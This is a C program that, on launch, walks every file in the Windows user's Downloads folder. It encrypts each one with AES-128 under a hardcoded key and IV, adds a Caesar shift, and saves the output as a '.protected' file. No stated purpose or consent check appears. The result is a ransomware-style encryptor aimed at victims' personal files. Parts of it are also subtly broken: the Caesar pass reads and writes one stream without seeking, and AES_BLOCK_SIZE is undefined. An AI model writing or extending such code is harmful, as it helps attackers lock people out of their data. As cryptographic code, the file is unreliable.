#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <dirent.h>
#include <windows.h>

#define AES_KEY_SIZE 16  // 128-bit key size for AES
#define BUFFER_SIZE 1024
#define CAESAR_SHIFT 3  // Caesar Cipher shift

// Function to apply AES encryption using OpenSSL's EVP API
void aes_encrypt(FILE *infile, FILE *outfile, unsigned char *key, unsigned char *iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("EVP_CIPHER_CTX_new failed");
        return;
    }

    // Initialize the AES encryption context
    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
        perror("EVP_EncryptInit_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    // Encrypt the file in chunks
    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, infile)) > 0) {
        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen) != 1) {
            perror("EVP_EncryptUpdate failed");
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, outfile);
    }

    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
        perror("EVP_EncryptFinal_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    fwrite(outbuf, 1, outlen, outfile);
    EVP_CIPHER_CTX_free(ctx);
}

// Caesar Cipher for additional encryption
void caesar_cipher(FILE *file) {
    unsigned char buffer[BUFFER_SIZE];
    size_t bytesRead;

    // Read and apply Caesar Cipher to the file in chunks
    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            // Encrypt characters (apply Caesar Cipher)
            if ((buffer[i] >= 'A' && buffer[i] <= 'Z') || (buffer[i] >= 'a' && buffer[i] <= 'z')) {
                if (buffer[i] >= 'A' && buffer[i] <= 'Z') {
                    buffer[i] = ((buffer[i] - 'A' + CAESAR_SHIFT) % 26) + 'A';
                } else if (buffer[i] >= 'a' && buffer[i] <= 'z') {
                    buffer[i] = ((buffer[i] - 'a' + CAESAR_SHIFT) % 26) + 'a';
                }
            }
        }
        fwrite(buffer, 1, bytesRead, file);  // Write the modified buffer back
    }
}

// Function to get the Downloads folder path from USERPROFILE
char* get_downloads_folder_path() {
    char *userProfile = getenv("USERPROFILE");
    if (userProfile == NULL) {
        fprintf(stderr, "USERPROFILE environment variable not found.\n");
        return NULL;
    }

    // Allocate memory for the full path
    char *downloadsPath = (char*)malloc(strlen(userProfile) + strlen("\\Downloads") + 1);
    if (downloadsPath == NULL) {
        perror("Memory allocation failed");
        return NULL;
    }

    // Construct the path to the Downloads folder
    sprintf(downloadsPath, "%s\\Downloads", userProfile);
    return downloadsPath;
}

// Function to encrypt a single file using AES and Caesar Cipher
void encrypt_file(const char *filepath, unsigned char *key, unsigned char *iv) {
    FILE *file = fopen(filepath, "r+b");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }

    // Create an encrypted file with .protected extension
    char encryptedFilePath[1024];
    sprintf(encryptedFilePath, "%s.protected", filepath);  // Save with .protected extension
    FILE *encryptedFile = fopen(encryptedFilePath, "w+b");
    if (encryptedFile == NULL) {
        perror("Error opening encrypted file");
        fclose(file);
        return;
    }

    // First apply AES encryption
    aes_encrypt(file, encryptedFile, key, iv);
    fclose(file);
    
    // Apply Caesar Cipher to the encrypted file
    fseek(encryptedFile, 0, SEEK_SET);  // Go to the beginning of the encrypted file
    caesar_cipher(encryptedFile);
    
    fclose(encryptedFile);
    printf("Encrypted file saved as: %s\n", encryptedFilePath);
}

// Function to scan the Downloads folder and encrypt all files
void encrypt_files_in_downloads(unsigned char *key, unsigned char *iv) {
    char *downloadsFolderPath = get_downloads_folder_path();
    if (downloadsFolderPath == NULL) {
        return;
    }

    DIR *dir = opendir(downloadsFolderPath);
    if (dir == NULL) {
        perror("Failed to open directory");
        free(downloadsFolderPath);
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Skip directories (we only want files)
        if (entry->d_type == DT_DIR) {
            continue;
        }

        // Construct the full file path
        char filePath[1024];
        sprintf(filePath, "%s\\%s", downloadsFolderPath, entry->d_name);

        // Encrypt the file
        encrypt_file(filePath, key, iv);
    }

    closedir(dir);
    free(downloadsFolderPath);
}

int main() {
    unsigned char aesKey[AES_KEY_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // 128-bit AES key
    unsigned char aesIv[AES_BLOCK_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // AES IV (initialization vector)

    encrypt_files_in_downloads(aesKey, aesIv);
    return 0;
}
